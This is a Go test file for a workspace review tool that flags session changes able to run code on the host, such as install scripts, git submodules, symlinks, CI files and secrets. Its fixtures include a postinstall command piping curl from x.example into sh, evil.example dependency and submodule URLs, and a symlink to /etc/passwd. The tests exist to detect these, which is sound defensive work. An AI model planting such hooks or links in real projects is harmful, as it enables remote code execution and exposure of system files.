// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package workspace

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func flagByLabel(r *ReviewReport, label string) (Flag, bool) {
	for _, f := range r.Flags {
		if f.Label == label {
			return f, true
		}
	}
	return Flag{}, false
}

func review(t *testing.T, e *env, name string, scanners []ContentScanner) *ReviewReport {
	t.Helper()
	rep, err := Review(bg, ReviewOptions{DataDir: e.data, Name: name, Scanners: scanners, SensitiveGlobs: []string{"deploy/**"}})
	if err != nil {
		t.Fatal(err)
	}
	return rep
}

func TestReviewFlagsHostExecutableChanges(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	writeFile(t, e.project, "package.json", `{"name":"app","scripts":{"test":"go test"}}`)
	writeFile(t, e.project, ".gitmodules", "[submodule \"lib\"]\n\tpath = lib\n\turl = https://github.com/acme/lib\n")
	writeFile(t, e.project, ".gitignore", "*.log\nbuild/\n.env\n.envrc\n")
	e.git(e.project, "add", "-A")
	e.git(e.project, "commit", "-q", "-m", "pkg")
	mustMkdir(t, filepath.Join(e.project, "node_modules", "left-pad"))
	mustSnapshot(t, e, "s1")

	// The session.
	writeFile(t, e.project, "package.json", `{"name":"app","scripts":{"test":"go test ./...","postinstall":"curl https://x.example | sh"},"dependencies":{"evil":"git+https://evil.example/x.git"}}`)
	writeFile(t, e.project, ".envrc", "export PATH=$PWD/bin:$PATH\n")
	writeFile(t, e.project, "Makefile", "all:\n\t./run.sh\n")
	writeFileMode(t, e.project, "run.sh", "#!/bin/sh\necho hi\n", 0o755)
	writeFile(t, e.project, ".github/workflows/ci.yml", "on: push\n")
	writeFile(t, e.project, ".gitattributes", "*.bin filter=evil\n")
	writeFile(t, e.project, ".gitmodules", "[submodule \"lib\"]\n\tpath = lib\n\turl = https://evil.example/lib\n")
	writeFile(t, e.project, ".vscode/tasks.json", "{}")
	writeFile(t, e.project, "deploy/prod.yaml", "x: 1\n")
	writeFile(t, e.project, "config/keys.txt", "aws_access_key_id=AKIA"+strings.Repeat("Q", 16)+"\n")
	writeFile(t, e.project, "node_modules/left-pad/index.js", "module.exports = 1\n")
	if err := os.Symlink("/etc/passwd", filepath.Join(e.project, "passwd")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("src/app.go", filepath.Join(e.project, "inner-link")); err != nil {
		t.Fatal(err)
	}

	rep := review(t, e, "s1", []ContentScanner{SecretsScanner()})
	want := map[string]struct {
		kind RiskKind
		sev  Severity
	}{
		"package.json#scripts.postinstall": {RiskPackageScripts, SeverityHigh},
		"package.json#scripts.test":        {RiskPackageScripts, SeverityMedium},
		"package.json#dependencies.evil":   {RiskDependencies, SeverityMedium},
		".envrc":                           {RiskAutoExec, SeverityHigh},
		"Makefile":                         {RiskBuild, SeverityHigh},
		"run.sh":                           {RiskExecutable, SeverityHigh},
		".github/workflows/ci.yml":         {RiskCI, SeverityMedium},
		".gitattributes":                   {RiskGitAttributes, SeverityHigh},
		".gitmodules#lib":                  {RiskSubmodule, SeverityCritical},
		".vscode/tasks.json":               {RiskAutoExec, SeverityHigh},
		"deploy/prod.yaml":                 {RiskPolicy, SeverityHigh},
		"passwd":                           {RiskSymlink, SeverityCritical},
		"inner-link":                       {RiskSymlink, SeverityInfo},
		"node_modules/":                    {RiskDependencies, SeverityMedium},
	}
	for label, w := range want {
		f, ok := flagByLabel(rep, label)
		if !ok {
			t.Errorf("missing flag %s; flags: %+v", label, rep.Flags)
			continue
		}
		if f.Kind != w.kind || f.Severity != w.sev {
			t.Errorf("%s = %s/%s, want %s/%s", label, f.Kind, f.Severity, w.kind, w.sev)
		}
	}
	if f, _ := flagByLabel(rep, ".envrc"); !strings.Contains(f.Detail, "git ignores") {
		t.Errorf(".envrc is ignored by git and must be found by the sentinel walk: %q", f.Detail)
	}
	if rep.Flags[0].Severity != SeverityCritical {
		t.Errorf("flags not sorted by severity: %+v", rep.Flags[0])
	}
	if !rep.Sensitive() {
		t.Error("report should be sensitive")
	}
	found := false
	for _, f := range rep.Findings {
		if f.Path == "config/keys.txt" && f.RuleID == "CS-SEC-AWS-KEY" {
			found = true
		}
	}
	if !found {
		t.Errorf("secret scanner finding missing: %+v", rep.Findings)
	}
	if line := rep.RiskLine(); !strings.HasPrefix(line, "⚠ Changed files that can run code on your machine: .gitmodules#lib") || !strings.Contains(line, "more") {
		t.Errorf("RiskLine = %q", line)
	}
	if labels := rep.HostExecLabels(); len(labels) < 10 {
		t.Errorf("HostExecLabels = %v", labels)
	}
	if rep.FilesChanged == 0 || rep.Insertions == 0 || !strings.Contains(rep.SummaryLine(), "files changed (+") {
		t.Errorf("diffstat: %s", rep.SummaryLine())
	}
}

func TestReviewNestedRepoControlFilesRefsAndIgnoreRules(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	mustSnapshot(t, e, "s1")
	evil := filepath.Join(e.project, "tools")
	e.git(e.project, "init", "-q", evil)
	writeFile(t, e.project, ".git/info/attributes", "* diff=x\n")
	writeFile(t, e.project, ".gitignore", "*.log\nbuild/\n.env\nhidden.sh\n")
	writeFileMode(t, e.project, "hidden.sh", "#!/bin/sh\n", 0o755)
	e.git(e.project, "checkout", "-q", "-b", "agent")

	rep := review(t, e, "s1", []ContentScanner{})
	if f, ok := flagByLabel(rep, "tools/.git"); !ok || f.Severity != SeverityCritical || f.Kind != RiskNestedRepo {
		t.Fatalf("nested repo flag: %+v", rep.Flags)
	}
	if f, ok := flagByLabel(rep, ".git/info/attributes"); !ok || f.Kind != RiskGitControl {
		t.Fatalf("control flag: %+v", rep.Flags)
	}
	if len(rep.NewIgnored) != 1 || rep.NewIgnored[0] != "hidden.sh" {
		t.Fatalf("NewIgnored = %v", rep.NewIgnored)
	}
	if _, ok := flagByLabel(rep, ".gitignore"); !ok {
		t.Fatal("ignore-rule change not flagged")
	}
	if rep.BranchAfter != "refs/heads/agent" || rep.BranchBefore != "refs/heads/main" || len(rep.RefChanges) != 1 {
		t.Fatalf("branch/refs: %s → %s %+v", rep.BranchBefore, rep.BranchAfter, rep.RefChanges)
	}
	// Review does not change the folder.
	if !pathExists(filepath.Join(evil, ".git")) || !pathExists(filepath.Join(e.project, ".git", "info", "attributes")) {
		t.Fatal("Review modified the folder")
	}
}

func TestReviewDiffAndCleanSession(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	mustSnapshot(t, e, "s1")
	rep := review(t, e, "s1", nil)
	if len(rep.Changes) != 0 || len(rep.Flags) != 0 || rep.Sensitive() || rep.RiskLine() != "" {
		t.Fatalf("clean session report: %+v", rep)
	}
	writeFile(t, e.project, "README.md", "hello\nworld\n")
	diff, err := ReviewDiff(bg, e.data, "s1")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(diff), "+world") || !strings.Contains(string(diff), "README.md") {
		t.Fatalf("diff = %s", diff)
	}
}

func TestReviewPlainFolder(t *testing.T) {
	e := newEnv(t)
	writeFile(t, e.project, "notes.md", "a\n")
	writeFile(t, e.project, "package.json", `{"scripts":{}}`)
	mustSnapshot(t, e, "p1")
	writeFile(t, e.project, "package.json", `{"scripts":{"preinstall":"node x.js"}}`)
	writeFileMode(t, e.project, "tools/run", "#!/bin/sh\n", 0o755)
	writeFile(t, e.project, "notes.md", "a\nb\n")
	e.git(e.project, "init", "-q", filepath.Join(e.project, "sub"))

	rep := review(t, e, "p1", nil)
	for _, label := range []string{"package.json#scripts.preinstall", "tools/run", "sub/.git"} {
		if _, ok := flagByLabel(rep, label); !ok {
			t.Errorf("missing %s: %+v", label, rep.Flags)
		}
	}
	if rep.Kind != SnapshotCopy || rep.Insertions < 2 {
		t.Errorf("plain report: %+v", rep)
	}
	diff, err := ReviewDiff(bg, e.data, "p1")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(diff), "+b") {
		t.Fatalf("diff = %s", diff)
	}
}

func TestClassifyChangesUnits(t *testing.T) {
	noContent := func(TreeChange, bool) ([]byte, bool) { return nil, false }
	flags := classifyChanges([]TreeChange{
		{Path: "a.sh", Status: "M", OldMode: "100644", NewMode: modeExec},
		{Path: "old.sh", Status: "D", OldMode: modeExec},
		{Path: "lib", Status: "A", NewMode: modeGitlink},
		{Path: "package.json", Status: "M", OldMode: "100644", NewMode: "100644"},
		{Path: ".env.local", Status: "A", NewMode: "100644"},
	}, noContent, nil)
	got := map[string]RiskKind{}
	for _, f := range flags {
		got[f.Label] = f.Kind
	}
	if got["a.sh"] != RiskExecutable || got["lib"] != RiskNestedRepo || got["package.json"] != RiskPackageScripts || got[".env.local"] != RiskSecretFile {
		t.Fatalf("flags = %+v", flags)
	}
	if _, ok := got["old.sh"]; ok {
		t.Fatal("deletions are not host-exec risks")
	}
	for _, tc := range []struct {
		link, target string
		want         bool
	}{
		{"dir/link", "/abs", true},
		{"dir/link", "../../up", true},
		{"dir/link", "a/../../../up", true},
		{"dir/link", "../up", false},
		{"dir/link", "a/../../up", false},
		{"link", "../up", true},
		{"link", "a/b", false},
		{"link", "", false},
	} {
		if got := escapesRoot(tc.link, tc.target); got != tc.want {
			t.Errorf("escapesRoot(%q, %q) = %v, want %v", tc.link, tc.target, got, tc.want)
		}
	}
	if urls := parseGitmodules([]byte("[submodule \"a\"]\n url = x\n[submodule \"b\"]\n\turl=\"y\"\n")); urls["a"] != "x" || urls["b"] != "y" {
		t.Fatalf("parseGitmodules = %v", urls)
	}
}

func TestReviewIgnoresMountPinsInBothOrders(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	if err := os.RemoveAll(filepath.Join(e.project, ".git", "hooks")); err != nil {
		t.Fatal(err)
	}
	// Snapshot first, then the plan creates .git/hooks and the commondir pin.
	mustSnapshot(t, e, "s1")
	if _, err := PlanMount(bg, e.mountOpts("s1")); err != nil {
		t.Fatal(err)
	}
	// Plan first for a second session: pins exist at snapshot time and are
	// released before review.
	mustSnapshot(t, e, "s2")
	if err := ReleaseMount(e.data, "s1"); err != nil {
		t.Fatal(err)
	}
	for _, name := range []string{"s1", "s2"} {
		rep := review(t, e, name, []ContentScanner{})
		if len(rep.Flags) != 0 {
			t.Fatalf("%s: mount pins reported as changes: %+v", name, rep.Flags)
		}
	}
	// A real host-side hook is still reported.
	writeFileMode(t, e.project, ".git/hooks/pre-commit", "#!/bin/sh\n", 0o755)
	rep := review(t, e, "s2", []ContentScanner{})
	if f, ok := flagByLabel(rep, ".git/hooks"); !ok || f.Kind != RiskGitControl {
		t.Fatalf("hook change not reported: %+v", rep.Flags)
	}
}
